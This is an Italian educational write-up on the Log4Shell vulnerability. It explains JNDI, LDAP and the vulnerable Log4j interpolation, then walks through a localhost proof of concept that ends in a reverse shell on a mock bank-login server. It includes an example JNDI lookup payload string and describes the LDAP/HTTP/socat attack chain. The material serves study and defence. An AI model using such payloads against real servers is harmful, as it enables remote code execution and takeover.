# Log4Shell

Log4Shell è una vulnerabilità del software di logging Apache Log4j, che permette all'attaccante di eseguire codice arbitrario (RCE: Remote Code Execution) sul server vulnerabile.
Il vettore di attacco di questa vulnerabilità è un payload malevolo (stringa) che, quando viene scritta nei log, permette all'utente di eseguire codice arbitrario sulla macchina, sfruttando due protocolli rispettivamente di indicizzazione e caricamento di oggetti Java remoti.

## Java Naming and Directory Interface (JNDI)
Si tratta di una Application Programming Interface che **offre un servizio di accesso a cartelle**, che permettono a programmi Java di 
**scoprire risorse e dati (sotto forma di oggetti Java)** tramite nome. <br>
Come tutte le API Java JNDI è indipendente dall'implementazione sottostante, e **supporta diversi SPI (service provider interface)** i quali offrono servizi di directory implementate diversamente. 
Le sorgenti e informazioni compatibili con JNDI sono vari (*server*, file, database, ...), la scelta dipende dall'implementazione utilizzata.

Esempi di SPI supportati da JNDI: **LDAP**, DNS, NIS, CORBA, file system.

### Lookup
JNDI organizza i nomi in una gerarchia, simile a quella dei package di Java (`com.example.test.MyObject`), quindi l'accesso all'oggetto
può essere definito tramite un oggetto che implementa l'interfaccia `Name` oppure direttamente come `String`.<br>
Generalmente oltre al nome dell'oggetto che si vuole ottenere è necessario anche un contesto con le informazioni necessarie allo SPI.

## Lightweight Directory Access Protocol (LDAP)
Si tratta di un protocollo internet di livello applicativo per accedere a *servizi di informazioni su cartelle*.
Inizialmente utilizzato per l'indicizzazione di cartelle di contatti, ad esempio rubriche telefoniche o contatti aziendali.<br>
Un client inizializza una sessione **LDAP** connettendosi ad un server, chiamato *Directory System Agent (DSA)*, le porte di default sono: 389 TCP e UDP, oppure 636 per LDAPS (LDAP over TLS/SSL). 

Il protocollo supporta diverse operazioni, sia di accesso che di modifica file.<br>
I dettagli dell'utilizzo originale di questo protocollo non sono particolarmente interessanti per il nostro caso di studio, 
tuttavia è da notare che LDAP supporta uno **schema URI** ben preciso per fare query richieste alle cartelle: `ldap://host:port/DN?attributes?scope?filter?extensions`.
Questo sarà un passaggio chiave per permettere l'accesso automatizzato all'oggetto Java malevolo.

## Comportamento Vulnerabile
Nella configurazione di default, quando la libreria **Log4j** scrive una stringa nei log attua una 
sostituzione di stringhe su espressione della forma: `${prefix:name}` (interpolazione di stringhe).<br>
Esempio: `Version: ${java:version}` diventa `Version: Java version 1.8.0_102`.
Tra le varie espressioni, è possibile utilizzare il ptocollo JNDI `${jndi:<ricerca>}` che permette di specificare una risorsa remota tramite diversi protocolli, tra cui LDAP: `${jndi:ldap://example.com/arbitrary_file}`.

Questo apre la possibilità all'attaccante tramite il logging una stringa all'interno del server di caricare ed eseguire codice malevolo servito su un URL pubblico.

LDAP non è l'unico protocollo supportato da JNDI che potrebbe essere sfruttato tramite la vulnerabilità Log4Shell, altri protocolli sono: LDAPS, RMI, DNS, IIOP.

## Mitigazione
Le fix per questa vulnerabilità sono state rilasciate 3 giorni prima che la vulnerabilità fosse resa pubblica (`Log4j-2.15.0-rc1`).
Sono state poi individuate da ricercatori altre vulnerabilità legate e derivate dalla prima, che permettevano di agire in certi tipi di configurazione (`2.16.0`) o con attacchi diversi da RCE come DoS (`2.17.0`).

Sono state prese misure di prevenzione anche nella Java Runtime Environment (JRE) dove è stato bloccato di default il caricamento di codice remoto.

Dove non possibile aggiornare le versioni, l'approccio è stato quello di filtrare il traffico in uscita al server vulnerabile, bloccando certi protocolli di accesso remoto.


# Proof of Concept
![project structure](img/project_structure.png)

La prova di concetto, utilizzata per visualizzare una dimostrazione pratica della vulnerabilità è: 
https://github.com/Dav-Forks-lab/log4j-shell-poc una fork dell'omonima repository che contiene il codice originale.

Tra tutte le possibili varianti di questo attacco questa PoC si concentra nell'utilizzare un server LDAP creato ad hoc per servire il file dell'exploit indipendentemente dalla stringa payload utilizzata.<br>
Il file di exploit, è quindi in automatico richiesto dal server, che per ottenere l'oggetto dalla ObjectFactory eseguirà codice di inizializzazione dove si trova il setup di una reverse shell verso l'attaccante.
L'attaccante quindi finisce per avere i **privilegi che ha il processo che esegue il server vulnerabile** (possibilmente anche **root**), *dirottando il thread* dell'esecuzione della risposta.

**porte dei server utilizzate**:
- `8080` → Server vulnerabile che utilizza libreria `Log4j`
- `1389` → Proof of Concept in Python (LDAP server che ridireziona l'accesso all'Exploit)
- `8000` → server HTTP di base usato dal protocollo LDAP per ottenere le risorse
- `9001` → socat per mettersi in ascolto sulla porta su cui verra eseguito reverse shell


## Server Vulnerabile (porta `8080`)

Si tratta di un server containerizzato utilizzante una vecchia versione di **Apache Tomcat**, che utilizza come JRE la versione `1.8-u102` rilasciata molto tempo prima che la JRE fosse protetta dall'abilitazione automatica dell'esecuzione remota di codice.

Tuttavia, siccome l'immagine di Docker utilizzata prendeva la versione della JRE dalle repository di Debian, essa conteneva backport delle fix delle JRE più recenti; 
questo ha portato alla scelta di utilizzare la versione originale della JRE scaricata dal sito di Oracle e inserita nell'imagine tramite Dockerfile.

Sul server con JRE obsoleto di TomCat è eseguito un **Java Servlet** costruito tramite *maven* che usa una versione di Log4j precedente al fix della vulnerabilità (`2.14.1`).<br>
Il Servlet mostra una pagina fac-simile del login di una banca, per rendere *vero-simile l'attacco*,
il codice eseguito alla pressione del tasto login utilizza la versione vulnerabile di Log4j 
per **scrivere nei log il nome utente** relativo alle credenziali inserite, se le credenziali non sono quelle corrette (*hardcode*) Log4j scriverà sul log il nome utente che ha fallito il login.


## Attacco (Python Proof of Concept)
Lo script di python (`poc.py`) prende 3 argomenti in input:
- `--userip`: ip del server che contiene i servizi dell'attaccante (in questa PoC è un singolo ip localhost)
- `--webport`: porta del server HTTP che serve il file `Exploit.class`
- `--lport`: porta del servizio SOCAT in ascolto per la creazione della reverse shell

### Generazione del Payload

L'exploit scritto in linguaggio Java è una classe che implementa ObjectFactory, questo perché JNDI ha un sistema di istanziazione automatica delle **Object Factories**, per permettere quindi al server di ottenere l'oggetto costruendolo direttamente (on the go) chiamando il metodo `getObjectInstance`; <br>
tuttavia all'interno di questo metodo di costruzione dell'oggetto può esserci codice arbitrario, che apre la possibilità a RCE (Remote Code Execution), e quindi come esempio più classico **reverse shell**.

![exploit](img/exploit.png)

Lo script contiene l'exploit scritto sotto forma di stringa letterale in Python, 
questo, durante l'esecuzione di `poc.py`, viene scritto nel file `Exploit.java` sostituendo i valori dell'ip e della porta dell'attaccante utilizzati per fare reverse shell;
il file viene poi compilato utilizzando una vecchia versione della JDK (`1.8-u20`), creando un file `Exploit.class`.


### Server attaccante: vettori d'attacco

![payload](img/payload.png)

In seguito lo script procede a creare un thread dove esegue il server LDAP (utilizzando la runtime `jdk-1.8-u20`) partendo dal file: `marshalsec-0.0.3-SNAPSHOT-all.jar`.
Queste risorse binarie sono offerte dalla repository [mbechler/marshalsec](https://github.com/mbechler/marshalsec): che contiene tooling relativo ad un paper informativo sulle vulnerabilità possibili
derivate dai sistemi di *smistamento* (serializzazione/deserializzazione/remote_callbacks) di oggetti in Java.

![ldap_server](img/ldap_server.png)

Questo server LDAP **ritorna in automatico reference JNDI valide**, quando viene fatta una richiesta LDAP di qualsiasi tipo ritorna un oggetto JNDI valido costruito dal file di exploit ottenuto dal server HTTP alla porta `8000`
facendo fetch della classe con nome uguale a quello dell'URI dopo il carattere `#`, nel caso della nostra PoC: `http://localhost:8000/#Exploit`

Riguardo al server HTTP che offre il file bytecode dell'exploit, si nota che diversamente dalla PoC originale, questa fork utilizza:
-  `LoggingHTTPRequestHandler` invece che `SimpleHTTPRequestHandler` per avere logging delle richieste HTTP avvenute
-  `DualStackHTTPServer` invece che `HTTPServer` per essere compatibile con Java for Linux che di default utilizza server HTTP dual-stack (sia socket IPv4 che IPv6)

### Attuazione attacco

A questo punto l'attaccante può procedere all'attacco del server vulnerabile in un qualsiasi browser,
inserendo la stringa payload, all'interno un campo che l'attaccante presume venga loggato.
![homepage](img/homepage.png)

Poi Log4j farà parsing della stringa contenente l'interpretazione JNDI della risorsa ottenuta dal server LDAP di cui è stato fatto il setup precedentemente, 
in seguito in file binario sarà ottenuto dal server dell'attaccante e successivamente istanziato tramite il meccanismo di JNDI (`getObjectInstance()`).

![tomcat](img/tomcat.png)
![ldap](img/ldap.png)

Infine l'esecuzione dell'exploit dirotterà il thread della richiesta al server vulnerabile verso una connessione socket (dual-stack), che permetterà al listener attivo sulla porta `9001` dell'ip dell'attaccante di comunicare tramite shell.

L'attaccante ha ora l'accesso completo alla macchina, dipendentemente dai privilegi con cui è stato eseguito il processo del server tomcat.

![reverse_shell](img/reverse_shell.png)

## Conclusione
Log4Shell è una vulnerabilità che ha scosso innumerevoli server e sistemi software che utilizzavano Log4j come libreria di log, o sistemi nei quali le dipendenze sfruttavano Log4j come libreria di log, 
la vulnerabilità è dovuta a una configurazione errata e combinata al valore di default per il parsing di questi protocolli che è normalmente attivo, feature raramente considerata tra le funzionalità principali della libreria.

